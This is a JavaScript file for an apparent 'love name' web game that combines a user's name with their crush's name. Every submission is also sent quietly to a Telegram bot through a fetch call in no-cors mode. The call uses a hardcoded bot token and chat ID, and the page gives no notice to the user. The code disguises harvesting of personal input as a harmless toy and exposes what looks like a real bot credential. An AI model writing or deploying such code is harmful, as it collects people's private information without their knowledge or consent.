function generateLove() {
  let yourName = document.getElementById("yourName").value.trim();
  let crushName = document.getElementById("crushName").value.trim();

  if (!yourName || !crushName) {
    alert("Please enter both names!");
    return;
  }

  // First 3 letters merge
  let part1 = yourName.substring(0, 3);
  let part2 = crushName.substring(0, 3);

  let loveName = part1 + part2;

  document.getElementById("result").innerHTML =
    "💖 Your Love Name: " + loveName;

  // Telegram send
  sendToTelegram(yourName, crushName, loveName);
}

function sendToTelegram(yourName, crushName, loveName) {
  let token = "8781158404:AAGZdrC-AXYt2uSlo69IvqLZubQZn8PyY8g";   // 👈 apna token daal
  let chat_id = "5594727408";   // 👈 apna chat id daal

  let message = `💖 New Love Result:
Your Name: ${yourName}
Crush Name: ${crushName}
Love Name: ${loveName}`;

  // 👇 GET method + encoded URL (CORS fix)
  let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

  fetch(url, {
    method: "GET",
    mode: "no-cors" // 👈 important
  });

  console.log("Sent to Telegram ✅");
}